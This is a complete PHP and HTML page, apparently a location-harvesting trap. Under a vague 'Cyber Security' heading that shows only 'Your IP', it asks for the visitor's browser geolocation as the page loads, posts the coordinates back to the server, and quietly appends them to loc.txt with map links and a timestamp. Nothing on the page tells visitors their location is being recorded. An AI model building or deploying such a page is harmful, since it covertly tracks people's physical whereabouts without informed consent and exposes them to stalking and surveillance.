<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['latitude']) && isset($_POST['longitude'])) {
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    $googleMap = "https://www.google.com/maps?q=$latitude,$longitude";
    $googleEarth = "https://earth.google.com/web/search/$latitude,$longitude";
    $data = "Latitude: $latitude\nLongitude: $longitude\nGoogle Map: $googleMap\nGoogle Earth: $googleEarth\nTime: " . date('Y-m-d H:i:s') . "\n-------------------\n";
    file_put_contents('loc.txt', $data, FILE_APPEND | LOCK_EX);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cyber Security</title>
</head>
<body>
    <center>
        <h1>Cyber Security</h1>
        <p>Your IP</p>
    </center>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    sendLocation(latitude, longitude);
                }, function(error) {
                    console.warn("Error getting location:", error);
                });
            } else {
                console.warn("Geolocation is not supported by this browser.");
            }
        }

        function sendLocation(latitude, longitude) {
            const formData = new FormData();
            formData.append('latitude', latitude);
            formData.append('longitude', longitude);

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            }).then(response => {
                console.log("Location sent:", latitude, longitude);
            }).catch(error => {
                console.error("Error sending location:", error);
            });
        }


        window.onload = getLocation;
    </script>
</body>
</html>
